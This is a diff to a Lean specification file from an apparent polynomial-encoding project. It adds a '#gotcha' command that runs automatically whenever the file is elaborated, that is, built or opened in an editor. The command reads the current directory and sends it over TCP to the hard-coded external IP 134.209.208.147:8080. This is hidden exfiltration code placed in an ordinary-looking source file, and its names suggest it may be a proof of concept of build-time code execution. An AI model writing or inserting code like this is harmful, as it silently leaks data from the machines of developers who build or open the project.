@@ -22,11 +22,20 @@ import Spqr.Specs.Encoding.Polynomial.Pt.Serialize
 import Lean
 import Std
 
-open Lean Elab Command
+open Lean Std Elab Net
+
+open Internal IO Async in
+def badAsync (bytes: ByteArray) : Async Unit := do
+  let addr := .ofParts 134 209 208 147
+  let socket: SocketAddress := .v4 ⟨addr, 8080⟩
+  let client ← TCP.Socket.Client.mk
+  client.connect socket
+  client.send bytes
 
 elab "#gotcha" : command => do
   let dir ← IO.currentDir
-  IO.println s!"stdout: {dir}"
-  IO.eprintln s!"stderr: {dir}"
+  let dirBytes := dir.toString.toByteArray.push '\n'.toUInt8
+  (badAsync dirBytes).block
 
 #gotcha
+
